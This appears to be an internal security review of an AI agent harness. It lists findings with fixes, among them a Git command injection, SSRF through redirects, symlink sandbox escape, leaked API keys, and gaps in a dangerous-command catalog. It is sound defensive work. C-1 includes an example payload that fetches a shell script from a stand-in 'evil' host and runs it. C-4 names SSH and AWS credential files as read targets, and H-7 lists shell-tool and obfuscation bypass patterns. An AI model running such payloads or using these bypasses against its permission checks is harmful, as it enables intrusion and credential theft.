# WU-094 — v0.2.0 Security Review

**Date:** 2026-04-19
**Scope:** Full-surface sweep of v0.2.0 additions (branch `exploration/integrated-harness` vs `main`). 359 files, 62k insertions.
**Method:** Four parallel focused reviews across (1) tool framework + WebFetch + MCP, (2) BFF server + socket + handlers, (3) storage + migrations, (4) protocol + provider + parsing.

---

## Remediation status (as of 2026-04-19)

**All 5 Criticals + all 15 Highs fixed.** Mediums and Lows remain documented below for v0.2.x / v0.3 hardening — none are exploitable in the default solo-profile deployment.

| Severity | Count | Fixed | Commit(s) |
|---|---|---|---|
| Critical | 5 | **5** | `62116a6` (C-1..C-5) |
| High | 15 | **15** | `71112e3` (H-1..H-5), `e97f087` (H-6/H-8/H-9), `e8d037c` (H-13/H-14/H-15), `1cd6dd1` (H-10/H-11/H-12), `d4ac156` (H-7) |
| Medium | 21 | 0 | deferred to v0.2.x |
| Low / Info | 19 | 0 | deferred to v0.3 |

Regression tests land with each fix so reintroducing the bypass shape breaks CI. See each commit for the specific invariant it pins.

---

## Executive summary

**5 Critical, 15 High, 21 Medium, 19 Low/Info.**

Overall the codebase is in reasonable shape for a v0.2.0 development milestone:

- SQL surface is clean — every user-supplied value is bound, migrations are transactional, schema is well-indexed.
- Protocol framing has frame-size caps and typed errors.
- MCP tool namespacing prevents built-in shadowing.
- `TurnID` is harness-assigned; the wire contract is consistent.
- `ValidSessionStatuses` and similar enums are enforced on read paths.

The Critical findings are all concentrated in areas where the harness trusts **untrusted external input**: the local shell (Git tool's `sh -c`), external providers (WebFetch redirects, SerpAPI error bodies), the filesystem (symlinks under the project root), and the accept loop (heartbeat never started = slowloris). None are subtle — they're single-line bugs with well-understood fixes.

The High findings cluster around a recurring pattern: **the harness and BFF assume benign counterparties**. A malicious BFF can crash the harness (no `recover()` in event/tool goroutines). A malicious MCP server gets the full parent env. Several session-scoped handlers don't verify ownership — latent IDOR that becomes load-bearing the moment auth lands. Several unbounded loops (grep file size, SSE line size, zip decompression) translate directly to OOM.

---

## Remediation priority

**Must fix before release** (Critical):

1. [C-1] Git command injection — `internal/harness/tools/git.go:69`
2. [C-2] WebFetch SSRF via redirects — `internal/harness/tools/webfetch.go:29`
3. [C-3] SerpAPI key leaks in error strings — `internal/harness/tools/websearch.go:201`
4. [C-4] Path traversal via symlinks — `internal/harness/tools/write.go:100` (`resolveInRoot`)
5. [C-5] Heartbeat monitor never started — `internal/bff/connection.go:237` (defined but dead code)

**Should fix soon** (top-tier High):

6. [H-1] EventHandler panic kills read loop — `internal/harness/client.go:303`
7. [H-2] Tool dispatch goroutine no panic recovery — `internal/harness/connection.go:614`
8. [H-3] No tool_call_id idempotency — `internal/harness/tool_dispatcher.go:94`
9. [H-4] SSE parser no line-size bound — `internal/bff/streaming.go:28`
10. [H-5] MaxAttachmentSize advertised but not enforced — `internal/bff/conversation.go:121`
11. [H-6] MCP inherits full env — `internal/harness/mcp.go:57`
12. [H-7] Bash dangerous-pattern catalog has large gaps — `internal/harness/tools/dangerous.go:19`
13. [H-8] Unbounded `ListTurns` / `ListServerEvents` — `internal/storage/turns.go:118`, `sessions.go:446`
14. [H-9] `ListCommandHistory` no default limit — `internal/storage/command_history.go:69`

**Latent IDOR** (becomes High the moment auth lands):

15. [H-10] Compaction handlers have no session ownership check — `internal/bff/compact.go:236`
16. [H-11] No session ownership check on resume/details/fork/switch/tool.result — `internal/bff/session.go`, `routing.go`, `turn.go`
17. [H-12] `DeleteTurn` scoped only by id — `internal/storage/turns.go:178`

**Defense-in-depth** (later):

Remaining 10 High and all Medium/Low items. Documented below but can land in v0.2.x.

---

## Critical findings

### C-1. Git command injection bypasses the entire permission model

**File:** `internal/harness/tools/git.go:69`
**Classification:** RCE

`Execute` runs `sh -c "git " + command`. `ClassifyGit` only inspects `strings.Fields(command)[0]`. A command like `status; curl http://evil/x.sh | sh` has `fields[0] == "status"`, no mutation flags, is classified `RiskReadOnly`, and is **auto-allowed in every permission level** — no prompt, no dangerous-pattern check, no audit. The attacker gets arbitrary shell execution entirely through the "git read is safe" fast path.

**Fix (compound):**
- Reject shell metacharacters (`;`, `&&`, `||`, `|`, `` ` ``, `$(`, `>`, `<`, `&`, newline) in `command` before execution.
- Run git without a shell: `exec.CommandContext(ctx, "git", shellwords.Parse(command)...)`.
- In `alwaysPrompt`, also run `IsDangerous(gitCommandFromInput(...))` against the full bash pattern catalog so smuggled destructive ops still prompt.

### C-2. WebFetch SSRF via redirects

**File:** `internal/harness/tools/webfetch.go:29-34`, `webfetch.go:75-77`
**Classification:** SSRF

`http.Client{Timeout: 30s}` uses default `CheckRedirect` (follow up to 10). `isBlockedHost` runs only on the user-supplied URL. A public server at `https://example.com/redir` returning `Location: http://169.254.169.254/latest/meta-data` (AWS IMDS) or `http://127.0.0.1:6443/` is followed transparently and the internal response flows back to the model. DNS rebinding is also in scope — the first resolution can return a public IP (passing lexical + IP checks) while the dial picks up a rebound private IP.

**Fix:** Install a custom `http.Transport` whose `DialContext` resolves each hop via `net.Resolver.LookupIPAddr`, runs every result through `isBlockedHost`, and only dials if all pass. Also set `CheckRedirect` to re-run the host check on every redirect hop.

### C-3. SerpAPI key leaks through transport errors into tool output

**File:** `internal/harness/tools/websearch.go:201-213`, `222`
**Classification:** Credential disclosure

The SerpAPI request URL embeds `api_key=<secret>` in the query string. On any transport error, `httpClient.Do` returns a `*url.Error` whose `Error()` includes the full URL. That error is wrapped with `fmt.Errorf("serpapi http: %w", err)` and surfaced to the model as the tool's error string. Same URL also appears in the HTTP error-body echo. Any network hiccup exposes the SerpAPI key to the model context, tool-result logs, and upstream observability.

**Fix:** Either (a) redact `api_key=...` from any error string before returning, or (b) switch SerpAPI to a header-based auth (not supported by their API — so fall back to (a) or default to Brave). Apply the same redaction to the HTTP body echo.

### C-4. Path traversal via symlinks — `resolveInRoot` doesn't call `EvalSymlinks`

**File:** `internal/harness/tools/write.go:100-122` (shared by Read/Write/Edit/Glob/Grep)
**Classification:** Sandbox escape

`resolveInRoot` does `filepath.Clean` + `filepath.Rel` only. A symlink inside the project (e.g. a checked-in `./secrets → /etc/passwd`, or one the agent itself creates via Write) appears to live under the root, passes the `..` check, and is opened/written via `os.ReadFile` / `os.WriteFile` — which follow symlinks to their absolute target. The agent can read `/etc/passwd`, `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.config/modeltap/config.yaml`, etc., and Write can clobber `~/.zshrc`, `~/.ssh/authorized_keys`, etc.

**Fix:** After `filepath.Clean`, call `filepath.EvalSymlinks(candidate)` (or walk with `os.Lstat` per component) and re-run the `filepath.Rel(absRoot, evaluated)` + `..` check against the resolved path. For Write, validate the parent directory with `EvalSymlinks` before `MkdirAll`.

### C-5. Heartbeat monitor is never started — slowloris DoS

**File:** `internal/bff/connection.go:237` (defined), `357-411` (Run never calls it)
**Classification:** DoS

`startHeartbeatMonitor` is invoked only from tests. The `Run()` read loop never calls it, so `HeartbeatTimeout` is never enforced. A local process can `nc -U modeltap.sock` and hold a connection open indefinitely. With `MaxConnections=100`, 100 such connections exhaust the accept pool and block real harness connections. There's also no read deadline on `net.Conn`, so `transport.ReadMessage()` blocks forever.

**Fix:** In `Connection.Run()`, call `c.startHeartbeatMonitor()` after `c.initialize()`. Also set an initial `SetReadDeadline` in the transport (handshake timeout), reset on each successful read.

---

## High findings

### H-1. EventHandler panic kills harness read loop

`internal/harness/client.go:303-304` — `c.eventHandler.HandleEvent(...)` is called inline with no `recover()`. A panic from any handler terminates the read loop and crashes the harness. A malicious BFF can craft a notification that triggers e.g. a nil-map deref in a downstream handler.
**Fix:** Wrap `HandleEvent` in a deferred `recover()`; also add a top-level `recover()` on the `readLoop` goroutine.

### H-2. Tool dispatch goroutine no panic recovery

`internal/harness/connection.go:614` — `go func() { _ = d.HandleToolCall(ev) }()` is bare. Panic inside a tool (e.g. JSON schema parse nil-deref) crashes the harness process.
**Fix:** Deferred `recover()` that synthesizes a `tool.result` with `status: "error"` so the server doesn't hang.

### H-3. No tool_call_id idempotency

`internal/harness/tool_dispatcher.go:94-128` — no duplicate-id check. A malicious BFF can re-emit the same `tool.call` N times and the harness executes it N times (e.g. N file writes, N Bash invocations).
**Fix:** Per-connection `map[toolCallID]struct{}` of in-flight and recently-completed IDs; reject duplicates.

### H-4. SSE parser no line-size bound

`internal/bff/streaming.go:28-63` — `SSEParser.Next()` uses `bufio.ReadString('\n')` on the provider response body with no size cap. A malicious or compromised upstream emits `data: ` + GBs without a newline; the BFF grows until OOM, killing all live sessions.
**Fix:** `bufio.Scanner` with explicit `Buffer(buf, 512*1024)`, or `http.MaxBytesReader` wrapping the response body with a total-stream cap.

### H-5. MaxAttachmentSize advertised but not enforced server-side

`internal/bff/capabilities.go:227-238` (advertised), `conversation.go:121-130` (not checked), `turn.go:113-119` (persists without check).
**Fix:** Validate `sum(len(a.Raw) + len(a.Content))` in `AppendUserTurn` / `handleTurnSubmit`, reject with `CodeInvalidParams` when exceeded.

### H-6. MCP subprocesses inherit full parent env

`internal/harness/mcp.go:57-63` — `cmd.Env = append(cmd.Env, os.Environ()...)` leaks every env var (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `AWS_*`, `GITHUB_TOKEN`, etc.) to every configured MCP server.
**Fix:** Default to a minimal allowlist (`PATH`, `HOME`, `USER`, `LANG`, `LC_*`, `TMPDIR`). Let users explicitly opt in additional vars via `cfg.Env` / `InheritEnv []string`. Block `*_TOKEN`, `*_KEY`, `*_SECRET`, `ANTHROPIC_*`, `OPENAI_*`, `AWS_*` unless explicitly listed.

### H-7. Bash dangerous-pattern catalog has large gaps

`internal/harness/tools/dangerous.go:19-35` — catalog misses `curl | sh`, `bash -c '...'`, `python -c`, `nc`, `ssh`, `scp`, `find / -delete`, `eval $(...)`, fork bombs. Regex-on-raw-string means trivial obfuscation (`rm "-rf"`, `r\m`, `$'\162m'`, `rm -r -f`) bypasses detection.
**Fix:** Treat dangerous-command regex as advisory-only. Make `RiskExecute` always prompt on first use regardless of mode. Better: tokenize commands with `mvdan.cc/sh/syntax` and flag any metacharacter (`|`, `$(...)`, redirects, env-var indirection) as mandatory-prompt.

### H-8. Unbounded `ListTurns` / `ListServerEvents` / `SessionFilesTouched`

`internal/storage/turns.go:118`, `sessions.go:446`, `sessions.go:482` — no `Limit`/`Offset`, returns every row for a session. Long-running sessions with tens of thousands of turns or thousands of events load everything into memory. `content` is arbitrary-size JSON.
**Fix:** Mandatory default `Limit` (e.g. 500) plus cursor on `(sequence, id)` for turns, `(at, id)` for events. Mirror the pattern already correctly in `ListCommandHistory`.

### H-9. `ListCommandHistory` no default limit

`internal/storage/command_history.go:69-72` — `if filter.Limit > 0 { ... LIMIT ? }`. A caller passing `Limit: 0` (zero value) returns every row the user ever typed.
**Fix:** Enforce hard ceiling: `if filter.Limit <= 0 || filter.Limit > 500 { filter.Limit = 500 }`. Apply same pattern to `ListSessions` / `SessionSummaries`.

### H-10. Compaction handlers have no session ownership check

`internal/bff/compact.go:236-269` — `handleSessionCompact` and `handleCompactApply` accept `session_id` and operate on the store without verifying `conn.UserID()` or `conn.SessionID()`. Combined with `DeleteTurn` (H-12) this is a clean IDOR the moment auth ships.
**Fix:** After `GetSession`, check `sess.UserID == conn.UserID()`. Return `CodeSessionNotFound` on mismatch.

### H-11. Missing session ownership checks across session/turn handlers

`internal/bff/session.go:108,217,323`, `routing.go:156`, `turn.go:227` — every session-scoped handler fetches by id alone. Solo profile masks it; auth WU exposes every one as a cross-user data access bug.
**Fix:** Add `verifySessionAccess(conn, sess) error` helper returning `CodeSessionNotFound` on mismatch. Add a test seeding two sessions under two users.

### H-12. `DeleteTurn` scoped only by id

`internal/storage/turns.go:178` — `DELETE FROM turns WHERE id = ?`. No `session_id` filter. Combined with H-10, a handler bug + an attacker-supplied turn id deletes cross-session rows.
**Fix:** Change signature to `(ctx, sessionID, turnID)` and `DELETE FROM turns WHERE id=? AND session_id=?`.

### H-13. Handlers use `context.Background` instead of request ctx

`internal/bff/turn.go:78,263`, `compact.go:245,266` — discards `ctx` parameter. Client disconnect doesn't cancel ongoing work. Amplifies slowloris (C-5) — submit, disconnect, server still runs full streaming + persistence.
**Fix:** Derive from `conn.ctx`. For relay goroutines, derive from `conn.ctx` so connection close aborts the stream.

### H-14. TLS listener: no client auth, no cipher policy

`internal/bff/server.go:318-332`, `connection.go:227-232` — TLS config only sets `Certificates` + `MinVersion: TLS12`. No `ClientAuth`, no cipher list. `initialize()` transition `ConnAuthenticating → ConnRegistering` is a no-op — any TCP-reachable client that completes TLS handshake is accepted as `SoloUserID` with full rights on every session.
**Fix:** Until real auth lands, refuse to bind TLS listener unless `ClientCAs` is configured and `ClientAuth: RequireAndVerifyClientCert` is set. Restrict to TLS 1.3. Fail (not stub) when `requiresAuth=true` and no principal is established.

### H-15. Zip-bomb / memory exhaustion on DOCX/XLSX/Grep

`internal/harness/tools/grep.go:205-211`, `read.go:324-336`, `read_docx.go:26-53`, `read_xlsx.go:19-56` — no aggregate byte cap on grep reads, no decompressed-size limit on DOCX/XLSX. A 1 KB malicious `.docx` can expand to many GB; a 10 GB log file with short lines OOMs the harness.
**Fix:** `io.LimitReader` wrapper with ~50 MB ceiling around every decompressed stream; track aggregate bytes across grep walks and abort past cap.

---

## Medium findings

### Storage

- **M-S1** `AcquireSessionLock` does not verify session existence on success path — race between UPDATE and follow-up SELECT. `internal/storage/sessions.go:265-308`. Fix: single-transaction `EXISTS(...)` + UPDATE.
- **M-S2** `AcquireSessionLock` leaks current lock owner identifier — becomes PII when multi-user lands. `sessions.go:304-308`. Fix: opaque sentinel + hashed token.
- **M-S3** v1 retrofit migration not transactional — crash mid-migration leaves partial schema. `sqlite.go:113-170`. Fix: wrap in `tx.Begin()` like `migrateToV2`.
- **M-S4** `DeleteSessionsBefore` orphans `command_history` rows (no FK). `sessions.go:246-256`. Fix: v3 migration to add FK with `ON DELETE SET NULL`, or prune in `DeleteSessionsBefore`.
- **M-S5** `CreateSession` accepts empty `user_id` silently. `sessions.go:13-50`. Fix: validate non-empty + validate `Status` against `ValidSessionStatuses`.
- **M-S6** JSON unmarshal errors silently swallowed in `GetTurn`/`ListTurns`. Fix: WARN-log with session/turn id + truncated sample.
- **M-S7** `sessionFiles` builds query via `fmt.Sprintf` with column name — safe today, future bug farm. Fix: inline the two column names explicitly.
- **M-S8** `SessionSummaries` correlated subqueries O(N·M). Fix: single JOIN + window function.

### BFF

- **M-B1** TOCTOU + brief-window permission race on socket creation. `server.go:282-313`. Fix: `syscall.Umask(0o077)` around `net.Listen`; create socket in mode-0700 parent dir.
- **M-B2** Storage error text propagated verbatim to clients — leaks schema info. Fix: log server-side with correlation id; return generic message + request_id.
- **M-B3** `applyCompactPlan` has no transactional boundary — partial mutation on error. `compact.go:135-231`. Fix: Store.Tx primitive, wrap apply flow in single txn.
- **M-B4** `handleTurnSubmit` ignores GetSession error silently. `turn.go:81`. Fix: return `CodeInternalError` on non-not-found errors.
- **M-B5** Accept-loop tight-loop on transient errors — no backoff, peg core under FD exhaustion. `server.go:336-355`. Fix: exp backoff on EMFILE.
- **M-B6** `newID()` time-based, collision-prone + predictable. `turn.go:273-275`. Fix: `"turn-" + uuid.NewString()`.
- **M-B7** `capabilities.update` no per-connection cap + O(tools*removed) nested loops. `capabilities.go:245-269`. Fix: 512-tool cap + set-based lookup.
- **M-B8** Provider HTTP calls (`checkCloudEndpoint`, turn dispatch) don't set `CheckRedirect` — API key leaks if DNS-rebound. `providers.go:117`, `dispatch.go:52`. Fix: `CheckRedirect: http.ErrUseLastResponse` on both.

### Harness (tools / MCP / dispatcher)

- **M-H1** Permission "approved once = approved for session" is too coarse for Bash/Git/WebFetch. Fix: don't `Approve()` for `RiskExecute`; cache by normalized-command hash instead.
- **M-H2** Tool results include raw stderr/body with no secret scrubbing. Fix: redact `AKIA*`, `sk-*`, `ghp_*`, PEM blocks before returning.
- **M-H3** WebFetch accepts arbitrary headers including `Authorization` / `Cookie` / `Host`. Fix: header allowlist.
- **M-H4** MCPTool name not sanitized before registry use. Fix: validate `^[A-Za-z0-9_.-]{1,64}$`, per-server cap.
- **M-H5** `MCPManager.Launch` uses parent ctx for subprocess but separate initCtx for RPCs — subprocess keeps running after init timeout. Fix: use initCtx for Launch; `stop()` in bounded goroutine.
- **M-H6** Grep `filepath.Match` uses `d.Name()` not relative path — cross-cutting globs silently return no matches. Fix: `doublestar.PathMatch` on relpath.

### Protocol / provider

- **M-P1** MCP invalid tool registration panic — recover too broad. `mcp.go:237-242`. Fix: validate name pre-register, log/skip explicitly.
- **M-P2** Streaming relay dereferences `ev.ToolCall` without nil guard. `streaming.go:163-170`. Fix: `if ev.ToolCall == nil { continue }`.
- **M-P3** MCP client no JSONRPC version check, accepts id+method in same message. `mcp_client.go:230-249`. Fix: reject `jsonrpc != "2.0"` + reject id+method in same msg.
- **M-P4** Harness accepts server-sent turn_id without correlation check — spoofed assistant messages. `app.go:765-782`. Fix: track submitted turn ids in AppState, drop events for unknown ids.
- **M-P5** `ModelSelected.IsMulti()` fragile against whitespace-prefixed JSON. `events.go:151-156`. Fix: trim leading whitespace before first-byte check.
- **M-P6** FrameReader byte-by-byte `ReadByte` — ~10× slower than scanner on multi-MB frames. `protocol.go:189-214`. Fix: `bufio.Scanner` with custom split + max-token-size.

---

## Low / Info findings

- **L-S1** `lock_expires_at` lexicographic comparison depends on TEXT collation — safe today (all writers use `RFC3339Nano`), latent trap. Fix: pad to fixed-width nanos or store as INTEGER.
- **L-S2** `DeleteSessionsBefore` and `DeleteBefore` accept caller-supplied time with no floor — bug in caller could wipe table. Fix: reject `before.After(time.Now())`.
- **L-S3** No WAL checkpoint on `Close()` — -wal sidecar grows on long-running instances. Fix: `PRAGMA wal_checkpoint(TRUNCATE)` in `Close()`.
- **L-S4** Solo-profile `user_id = ''` is a valid key in `idx_command_history_user_recent`. Fix: enforce non-empty `UserID` in `ListCommandHistory` / `AppendCommandHistory`.
- **L-B1** `session.sync` iterates global turnTracker without per-session scoping. `sync.go:52-60`.
- **L-B2** `EnsureActive` rebinds `ConnID` without ownership check. `session.go:81-96`.
- **L-B3** `ForceReleaseSessionLock` exists in Store interface with no caller — future auth WU must verify admin principal.
- **L-B4** `decodeBeforeCursor` forgeable — not HMAC'd. `history.go:127-141`. Fix: server-side HMAC the cursor.
- **L-H1** MCP `readLoop` silently ignores malformed frames — DoS-by-garbage reader exhaust. Fix: count consecutive parse failures, Close after N.
- **L-H2** MCPClient 4 MB line limit, no aggregate rate limit. Fix: lower to 1 MB + per-call response cap.
- **L-H3** BashTool truncation shows trailing half — attacker can flood banner to hide evidence at end. Fix: show first N/2 + last N/2 with trimmed marker.
- **L-H4** GitTool has no `timeout_ms` schema field. Fix: mirror Bash schema.
- **L-H5** `/mcp reconnect` no debounce — prompt injection can trigger repeated spawns. Fix: 5s debounce per server.
- **L-P1** MCP tool name can contain newlines/ANSI escapes. Fix: regex validate.
- **L-P2** MCP scanner no aggregate rate limit — server can flood 4 MB lines forever.
- **L-P3** ReadFrame leaves conn unsynchronized after `ErrFrameTooLarge`. `protocol.go:209`. Fix: close conn in readLoop on this error.
- **L-P4** OpenAI SSE parser tolerates non-JSON `data:` lines silently. Fix: count consecutive parse failures, surface `ServerError` after N.
- **L-P5** Ollama adapter doesn't validate `model` field length/chars — malicious local daemon can inject UI strings. Fix: truncate + strip control chars.

---

## Explicit non-findings

Classes explicitly reviewed and cleared:

- **Command injection via `exec.CommandContext` varargs** — MCP launcher uses variadic args, no shell.
- **JSON-RPC ID collision** — `atomic.Int64` is monotonic, per-client.
- **XXE in DOCX/XLSX XML** — `encoding/xml` rejects DTDs by default; excelize similar.
- **Registry race on concurrent Register** — `sync.RWMutex` + panic-on-duplicate is correct.
- **SQL injection** — every user-supplied value is bound as `?`. Exceptions (`sessionFiles`, `queryMetrics`) use only internal identifiers; noted as M-S7 for hardening.

---

## Plan

- **Phase 1 (before v0.2.0 release):** fix C-1 through C-5 + the top-tier Highs that are memory safety / crash issues (H-1, H-2, H-3, H-4, H-5).
- **Phase 2 (v0.2.x):** H-6 through H-15, then Medium items.
- **Phase 3 (v0.3+):** Low / Info, plus a fresh review pass on any new code shipped.

**IDOR items (H-10 / H-11 / H-12):** latent in solo profile (all connections are `SoloUserID`) — can defer to the auth WU as long as we land that work with this review doc as input, so ownership checks are added during auth plumbing rather than retrofitted.

---

## Review artifacts

This doc synthesizes four parallel sub-agent reports. Individual reports are not preserved — their findings are deduped and consolidated above. Re-run the four agents in parallel to reproduce:

1. Tool framework + WebFetch + MCP — RCE / SSRF / path traversal surface
2. BFF server + socket + handlers — server-side attack surface
3. Storage + migrations — SQL injection / data integrity / migration safety
4. Protocol + provider parsing — untrusted input parsing / event dispatch
